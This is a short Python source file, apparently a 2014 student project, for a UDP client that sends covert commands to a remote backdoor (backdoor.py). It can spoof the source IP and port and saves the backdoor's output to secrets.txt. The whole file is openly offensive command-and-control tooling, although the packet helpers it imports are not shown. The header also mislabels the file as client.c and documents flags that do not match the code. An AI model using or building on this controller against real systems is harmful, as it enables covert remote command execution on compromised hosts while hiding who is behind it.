#####################################################################################################################
##	SOURCE FILE:		client.c - A simple UDP client that sends covert messages to a backdoor.
##
##	PROGRAM:		    client
##
##	FUNCTIONS:
##
##	LAST MODIFIED:		October 6, 2014
##
##	DESIGNERS:	        Slade Solobay & Zach Smoroden
##
##	PROGRAMMERS:        Slade Solobay & Zach Smoroden
##
##	NOTES:
##	The program will send a covert message to a specific IP address (an IP running the backdoor.py) over a specific
##  destination port. The program also has the ability to spoof the source port and source IP address. Once a command
##  is sent the client will wait for a response from the backdoor and save the output to secrets.txt.
##
##  OUTPUT: secrets.txt - will be saved in the program root directory.
##
##	USAGE: ./client -d [Destination IP] -p [Destination Port] -h [Source IP] -s [Source Port] -i [Interface]
##
#####################################################################################################################
import sys
from client_utils import*
from client_packet import*
import time
import os
import re
import getopt

try:
    opts, args = getopt.getopt(sys.argv[1:], 'd:p:b:s:i:l:h', ['dest=', 'dport=', 'src=', 'sport=', 'interface=', 'listener=', 'help'])
except getopt.GetoptError:
    usage()
    sys.exit(2)

for opt, arg in opts:
    if opt in ('-h', '--help'):
        usage()
        sys.exit(0)
    elif opt in ('-d', '--dest'):
        packet['dest'] = arg
    elif opt in ('-p', '--dport'):
        packet['dport'] = arg
    elif opt in ('-b', '--src'):
        packet['src'] = arg
    elif opt in ('-s', '--sport'):
        packet['sport'] = arg
    elif opt in ('-i', '--interface'):
        packet['interface'] = arg
    elif opt in ('-l', '--listener'):
        packet['lport'] = arg
    else:
        usage()
        sys.exit(2)

##Did they supply a destination IP?
if not packet['dest']:
    usage()
    sys.exit(2)

##Get commands from user
while 1:
    packet['cmd'] = raw_input("\nPlease enter a covert command (or type \"quit\"): \n")
    if packet['cmd'] == "quit":
        sys.exit(0)
    sniff_packets(packet['dest'])
    send_packet(packet)

